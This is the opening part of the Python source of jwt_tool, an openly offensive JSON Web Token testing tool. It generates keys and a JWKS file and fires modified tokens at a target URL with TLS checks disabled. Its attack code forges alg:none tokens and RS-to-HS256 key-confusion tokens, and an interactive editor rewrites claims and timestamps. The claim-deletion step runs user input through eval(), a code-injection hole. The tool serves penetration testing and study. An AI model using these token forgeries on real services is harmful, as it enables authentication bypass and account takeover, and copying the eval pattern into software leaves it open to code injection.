#!/usr/bin/env python3
#
# JWT_Tool version 2.2.6 (09_09_2022)
# Written by Andy Tyler (@ticarpi)
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi

jwttoolvers = "2.2.6"
import ssl
import sys
import os
import re
import hashlib
import hmac
import base64
import json
import random
import argparse
from datetime import datetime
import configparser
from http.cookies import SimpleCookie
from collections import OrderedDict
try:
    from Cryptodome.Signature import PKCS1_v1_5, DSS, pss
    from Cryptodome.Hash import SHA256, SHA384, SHA512
    from Cryptodome.PublicKey import RSA, ECC
except:
    print("WARNING: Cryptodome libraries not imported - these are needed for asymmetric crypto signing and verifying")
    print("On most Linux systems you can run the following command to install:")
    print("python3 -m pip install pycryptodomex\n")
    exit(1)
try:
    from termcolor import cprint
except:
    print("WARNING: termcolor library is not imported - this is used to make the output clearer and oh so pretty")
    print("On most Linux systems you can run the following command to install:")
    print("python3 -m pip install termcolor\n")
    exit(1)
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except:
    print("WARNING: Python Requests libraries not imported - these are needed for external service interaction")
    print("On most Linux systems you can run the following command to install:")
    print("python3 -m pip install requests\n")
    exit(1)
# To fix broken colours in Windows cmd/Powershell: uncomment the below two lines. You will need to install colorama: 'python3 -m pip install colorama'
# import colorama
# colorama.init()

def cprintc(textval, colval):
    if not args.bare:
        cprint(textval, colval)

def createConfig():
    privKeyName = path+"/jwttool_custom_private_RSA.pem"
    pubkeyName = path+"/jwttool_custom_public_RSA.pem"
    ecprivKeyName = path+"/jwttool_custom_private_EC.pem"
    ecpubkeyName = path+"/jwttool_custom_public_EC.pem"
    jwksName = path+"/jwttool_custom_jwks.json"
    proxyHost = "127.0.0.1"
    config = configparser.ConfigParser(allow_no_value=True)
    config.optionxform = str
    config['crypto'] = {'pubkey': pubkeyName,
        'privkey': privKeyName,
        'ecpubkey': ecpubkeyName,
        'ecprivkey': ecprivKeyName,
        'jwks': jwksName}
    config['customising'] = {'useragent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) jwt_tool',
        'jwks_kid': 'jwt_tool'}
    if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):
        cprintc("Found existing Public and Private Keys - using these...", "cyan")
        origjwks = open(jwksName, "r").read()
        jwks_b64 = base64.b64encode(origjwks.encode('ascii'))
    else:
        # gen RSA keypair
        pubKey, privKey = newRSAKeyPair()
        with open(privKeyName, 'w') as test_priv_out:
            test_priv_out.write(privKey.decode())
        with open(pubkeyName, 'w') as test_pub_out:
            test_pub_out.write(pubKey.decode())
        # gen EC keypair
        ecpubKey, ecprivKey = newECKeyPair()
        with open(ecprivKeyName, 'w') as ectest_priv_out:
            ectest_priv_out.write(ecprivKey)
        with open(ecpubkeyName, 'w') as ectest_pub_out:
            ectest_pub_out.write(ecpubKey)
        # gen jwks
        new_key = RSA.importKey(pubKey)
        n = base64.urlsafe_b64encode(new_key.n.to_bytes(256, byteorder='big'))
        e = base64.urlsafe_b64encode(new_key.e.to_bytes(3, byteorder='big'))
        jwksbuild = buildJWKS(n, e, "jwt_tool")
        jwksout = {"keys": []}
        jwksout["keys"].append(jwksbuild)
        fulljwks = json.dumps(jwksout,separators=(",",":"), indent=4)
        with open(jwksName, 'w') as test_jwks_out:
                test_jwks_out.write(fulljwks)
        jwks_b64 = base64.urlsafe_b64encode(fulljwks.encode('ascii'))
    config['services'] = {'jwt_tool_version': jwttoolvers,
        '# To disable the proxy option set this value to: False (no quotes). For Docker installations with a Windows host OS set this to: "host.docker.internal:8080"': None, 'proxy': proxyHost+':8080',
        '# To disable following redirects set this value to: False (no quotes)': None, 'redir': 'True',
        '# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server, or maybe use this cheeky reflective URL (https://httpbin.org/base64/{base64-encoded_JWKS_here})': None,
        'jwksloc': '',
        'jwksdynamic': 'https://httpbin.org/base64/'+jwks_b64.decode(),
        '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None, 'httplistener': ''}
    config['input'] = {'wordlist': 'jwt-common.txt',
        'commonHeaders': 'common-headers.txt',
        'commonPayloads': 'common-payloads.txt'}
    config['argvals'] = {'# Set at runtime - changes here are ignored': None,
        'sigType': '',
        'targetUrl': '',
        'cookies': '',
        'key': '',
        'keyList': '',
        'keyFile': '',
        'headerLoc': '',
        'payloadclaim': '',
        'headerclaim': '',
        'payloadvalue': '',
        'headervalue': '',
        'canaryvalue': '',
        'header': '',
        'exploitType': '',
        'scanMode': '',
        'reqMode': '',
        'postData': '',
        'resCode': '',
        'resSize': '',
        'resContent': ''}
    with open(configFileName, 'w') as configfile:
        config.write(configfile)
    cprintc("Configuration file built - review contents of \"jwtconf.ini\" to customise your options.", "cyan")
    cprintc("Make sure to set the \"httplistener\" value to a URL you can monitor to enable out-of-band checks.", "cyan")
    exit(1)

def sendToken(token, cookiedict, track, headertoken="", postdata=None):
    if not postdata:
        postdata = config['argvals']['postData']
    url = config['argvals']['targetUrl']
    headers = {'User-agent': config['customising']['useragent']+" "+track}
    if headertoken:
        for eachHeader in headertoken:
            headerName, headerVal = eachHeader.split(":",1)
            headers[headerName] = headerVal.lstrip(" ")
    try:
        if config['services']['redir'] == "True":
            redirBool = True
        else:
            redirBool = False
        if config['services']['proxy'] == "False":
            if postdata:
                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)
            else:
                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=False, verify=False, allow_redirects=redirBool)
        else:
            proxies = {'http': 'http://'+config['services']['proxy'], 'https': 'http://'+config['services']['proxy']}
            if postdata:
                response = requests.post(url, data=postdata, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)
            else:
                response = requests.get(url, headers=headers, cookies=cookiedict, proxies=proxies, verify=False, allow_redirects=redirBool)
        if int(response.elapsed.total_seconds()) >= 9:
            cprintc("HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability", "cyan")
        return [response.status_code, len(response.content), response.content]
    except requests.exceptions.ProxyError as err:
        cprintc("[ERROR] ProxyError - check proxy is up and not set to tamper with requests\n"+str(err), "red")
        exit(1)

def parse_dict_cookies(value):
    cookiedict = {}
    for item in value.split(';'):
        item = item.strip()
        if not item:
            continue
        if '=' not in item:
            cookiedict[item] = None
            continue
        name, value = item.split('=', 1)
        cookiedict[name] = value
    return cookiedict

def strip_dict_cookies(value):
    cookiestring = ""
    for item in value.split(';'):
        if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', item):
            continue
        else:
            cookiestring += "; "+item
        cookiestring = cookiestring.lstrip("; ")
    return cookiestring

def jwtOut(token, fromMod, desc=""):
    genTime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    idFrag = genTime+str(token)
    logID = "jwttool_"+hashlib.md5(idFrag.encode()).hexdigest()
    if config['argvals']['targetUrl'] != "":
        curTargetUrl = config['argvals']['targetUrl']
        p = re.compile('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*')

        if config['argvals']['headerloc'] == "cookies":
            cookietoken = p.subn(token, config['argvals']['cookies'], 0)
        else:
            cookietoken = [config['argvals']['cookies'],0]

        if config['argvals']['headerloc'] == "headers":
            headertoken = [[],0]
            for eachHeader in args.headers:
                try:
                    headerSub = p.subn(token, eachHeader, 0)
                    headertoken[0].append(headerSub[0])
                    if headerSub[1] == 1:
                        headertoken[1] = 1
                except:
                    pass
        else:
            headertoken = [[],0]
            if args.headers:
                for eachHeader in args.headers:
                        headertoken[0].append(eachHeader)

        if config['argvals']['headerloc'] == "postdata":
            posttoken = p.subn(token, config['argvals']['postdata'], 0)
        else:
            posttoken = [config['argvals']['postdata'],0]


        try:
            cookiedict = parse_dict_cookies(cookietoken[0])
        except:
            cookiedict = {}



        # Check if token was included in substitution
        if cookietoken[1] == 1 or headertoken[1] == 1 or posttoken[1]:
            resData = sendToken(token, cookiedict, logID, headertoken[0], posttoken[0])
        else:
            if config['argvals']['overridesub'] == "true":
                resData = sendToken(token, cookiedict, logID, headertoken[0], posttoken[0])
            else:
                cprintc("[-] No substitution occurred - check that a token is included in a cookie/header in the request", "red")
                # cprintc(headertoken, cookietoken, "cyan")
                exit(1)
        if config['argvals']['canaryvalue']:
            if config['argvals']['canaryvalue'] in str(resData[2]):
                cprintc("[+] FOUND \""+config['argvals']['canaryvalue']+"\" in response:\n"+logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
            else:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
        else:
            if 200 <= resData[0] < 300:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "green")
            elif 300 <= resData[0] < 400:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "cyan")
            elif 400 <= resData[0] < 600:
                cprintc(logID + " " + fromMod + " Response Code: " + str(resData[0]) + ", " + str(resData[1]) + " bytes", "red")
    else:
        if desc != "":
            cprintc(logID+" - "+desc, "cyan")
        if not args.bare:
            cprintc("[+] "+token, "green")
        else:
            print(token)
        curTargetUrl = "Not sent"
    additional = "[Commandline request: "+' '.join(sys.argv[0:])+']'
    setLog(token, genTime, logID, fromMod, curTargetUrl, additional)
    try:
        config['argvals']['rescode'],config['argvals']['ressize'],config['argvals']['rescontent'] = str(resData[0]),str(resData[1]),str(resData[2])
    except:
        pass

def setLog(jwt, genTime, logID, modulename, targetURL, additional):
    logLine = genTime+" | "+modulename+" | "+targetURL+" | "+additional
    with open(logFilename, 'a') as logFile:
        logFile.write(logID+" - "+logLine+" - "+jwt+"\n")
    return logID

def buildHead(alg, headDict):
    newHead = headDict
    newHead["alg"] = alg
    newHead = base64.urlsafe_b64encode(json.dumps(newHead,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newHead

def checkNullSig(contents):
    jwtNull = contents.decode()+"."
    return jwtNull

def checkAlgNone(headDict, paylB64):
    alg1 = "none"
    newHead1 = buildHead(alg1, headDict)
    CVEToken0 = newHead1+"."+paylB64+"."
    alg = "None"
    newHead = buildHead(alg, headDict)
    CVEToken1 = newHead+"."+paylB64+"."
    alg = "NONE"
    newHead = buildHead(alg, headDict)
    CVEToken2 = newHead+"."+paylB64+"."
    alg = "nOnE"
    newHead = buildHead(alg, headDict)
    CVEToken3 = newHead+"."+paylB64+"."
    return [CVEToken0, CVEToken1, CVEToken2, CVEToken3]

def checkPubKeyExploit(headDict, paylB64, pubKey):
    try:
        key = open(pubKey).read()
        cprintc("File loaded: "+pubKey, "cyan")
    except:
        cprintc("[-] File not found", "red")
        exit(1)
    newHead = headDict
    newHead["alg"] = "HS256"
    newHead = base64.urlsafe_b64encode(json.dumps(headDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    newTok = newHead+"."+paylB64
    newSig = base64.urlsafe_b64encode(hmac.new(key.encode(),newTok.encode(),hashlib.sha256).digest()).decode('UTF-8').strip("=")
    return newTok, newSig

def injectpayloadclaim(payloadclaim, injectionvalue):
    newpaylDict = paylDict
    newpaylDict[payloadclaim] = castInput(injectionvalue)
    newPaylB64 = base64.urlsafe_b64encode(json.dumps(newpaylDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newpaylDict, newPaylB64

def injectheaderclaim(headerclaim, injectionvalue):
    newheadDict = headDict
    newheadDict[headerclaim] = castInput(injectionvalue)
    newHeadB64 = base64.urlsafe_b64encode(json.dumps(newheadDict,separators=(",",":")).encode()).decode('UTF-8').strip("=")
    return newheadDict, newHeadB64

def tamperToken(paylDict, headDict, sig):
    cprintc("\n====================================================================\nThis option allows you to tamper with the header, contents and \nsignature of the JWT.\n====================================================================", "white")
    cprintc("\nToken header values:", "white")
    while True:
        i = 0
        headList = [0]
        for pair in headDict:
            menuNum = i+1
            if isinstance(headDict[pair], dict):
                cprintc("["+str(menuNum)+"] "+pair+" = JSON object:", "green")
                for subclaim in headDict[pair]:
                    cprintc("    [+] "+subclaim+" = "+str(headDict[pair][subclaim]), "green")
            else:
                if type(headDict[pair]) == str:
                    cprintc("["+str(menuNum)+"] "+pair+" = \""+str(headDict[pair])+"\"", "green")
                else:
                    cprintc("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "green")
            headList.append(pair)
            i += 1
        cprintc("["+str(i+1)+"] *ADD A VALUE*", "white")
        cprintc("["+str(i+2)+"] *DELETE A VALUE*", "white")
        cprintc("[0] Continue to next step", "white")
        selection = ""
        cprintc("\nPlease select a field number:\n(or 0 to Continue)", "white")
        try:
            selection = int(input("> "))
        except:
            cprintc("Invalid selection", "red")
            exit(1)
        if selection<len(headList) and selection>0:
            if isinstance(headDict[headList[selection]], dict):
                cprintc("\nPlease select a sub-field number for the "+pair+" claim:\n(or 0 to Continue)", "white")
                newVal = OrderedDict()
                for subclaim in headDict[headList[selection]]:
                    newVal[subclaim] = headDict[pair][subclaim]
                newVal = buildSubclaim(newVal, headList, selection)
                headDict[headList[selection]] = newVal
            else:
                cprintc("\nCurrent value of "+headList[selection]+" is: "+str(headDict[headList[selection]]), "white")
                cprintc("Please enter new value and hit ENTER", "white")
                newVal = input("> ")
            headDict[headList[selection]] = castInput(newVal)
        elif selection == i+1:
            cprintc("Please enter new Key and hit ENTER", "white")
            newPair = input("> ")
            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
            newInput = input("> ")
            headList.append(newPair)
            headDict[headList[selection]] = castInput(newInput)
        elif selection == i+2:
            cprintc("Please select a Key to DELETE and hit ENTER", "white")
            i = 0
            for pair in headDict:
                menuNum = i+1
                cprintc("["+str(menuNum)+"] "+pair+" = "+str(headDict[pair]), "white")
                headList.append(pair)
                i += 1
            try:
                delPair = int(input("> "))
            except:
                cprintc("Invalid selection", "red")
                exit(1)
            del headDict[headList[delPair]]
        elif selection == 0:
            break
        else:
            exit(1)
    cprintc("\nToken payload values:", "white")
    while True:
        comparestamps, expiredtoken = dissectPayl(paylDict, count=True)
        i = 0
        paylList = [0]
        for pair in paylDict:
            menuNum = i+1
            paylList.append(pair)
            i += 1
        cprintc("["+str(i+1)+"] *ADD A VALUE*", "white")
        cprintc("["+str(i+2)+"] *DELETE A VALUE*", "white")
        if len(comparestamps) > 0:
            cprintc("["+str(i+3)+"] *UPDATE TIMESTAMPS*", "white")
        cprintc("[0] Continue to next step", "white")
        selection = ""
        cprintc("\nPlease select a field number:\n(or 0 to Continue)", "white")
        try:
            selection = int(input("> "))
        except:
            cprintc("Invalid selection", "red")
            exit(1)
        if selection<len(paylList) and selection>0:
            if isinstance(paylDict[paylList[selection]], dict):
                cprintc("\nPlease select a sub-field number for the "+str(paylList[selection])+" claim:\n(or 0 to Continue)", "white")
                newVal = OrderedDict()
                for subclaim in paylDict[paylList[selection]]:
                    newVal[subclaim] = paylDict[paylList[selection]][subclaim]
                newVal = buildSubclaim(newVal, paylList, selection)
                paylDict[paylList[selection]] = newVal
            else:
                cprintc("\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]]), "white")
                cprintc("Please enter new value and hit ENTER", "white")
                newVal = input("> ")
                paylDict[paylList[selection]] = castInput(newVal)
        elif selection == i+1:
            cprintc("Please enter new Key and hit ENTER", "white")
            newPair = input("> ")
            cprintc("Please enter new value for "+newPair+" and hit ENTER", "white")
            newVal = input("> ")
            try:
                newVal = int(newVal)
            except:
                pass
            paylList.append(newPair)
            paylDict[paylList[selection]] = castInput(newVal)
        elif selection == i+2:
            cprintc("Please select a Key to DELETE and hit ENTER", "white")
            i = 0
            for pair in paylDict:
                menuNum = i+1
                cprintc("["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair]), "white")
                paylList.append(pair)
                i += 1
            delPair = eval(input("> "))
            del paylDict[paylList[delPair]]
        elif selection == i+3:
            cprintc("Timestamp updating:", "white")
            cprintc("[1] Update earliest timestamp to current time (keeping offsets)", "white")
            cprintc("[2] Add 1 hour to timestamps", "white")
            cprintc("[3] Add 1 day to timestamps", "white")
            cprintc("[4] Remove 1 hour from timestamps", "white")
            cprintc("[5] Remove 1 day from timestamps", "white")
            cprintc("\nPlease select an option from above (1-5):", "white")
            try:
                selection = int(input("> "))
            except:
                cprintc("Invalid selection", "red")
                exit(1)
            if selection == 1:
                nowtime = int(datetime.now().timestamp())
                timecomp = {}
                for timestamp in comparestamps:
                    timecomp[timestamp] = paylDict[timestamp]
                earliest = min(timecomp, key=timecomp.get)
                earlytime = paylDict[earliest]
                for timestamp in comparestamps:
                    if timestamp == earliest:
                        paylDict[timestamp] = nowtime
                    else:
                        difftime = int(paylDict[timestamp])-int(earlytime)
                        paylDict[timestamp] = nowtime+difftime
            elif selection == 2:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+3600
                    paylDict[timestamp] = newVal
            elif selection == 3:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])+86400
                    paylDict[timestamp] = newVal
            elif selection == 4:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-3600
                    paylDict[timestamp] = newVal
            elif selection == 5:
                for timestamp in comparestamps:
                    newVal = int(paylDict[timestamp])-86400
                    paylDict[timestamp] = newVal
            else:
                cprintc("Invalid selection", "red")
                exit(1)
        elif selection == 0:
            break
        else:
            exit(1)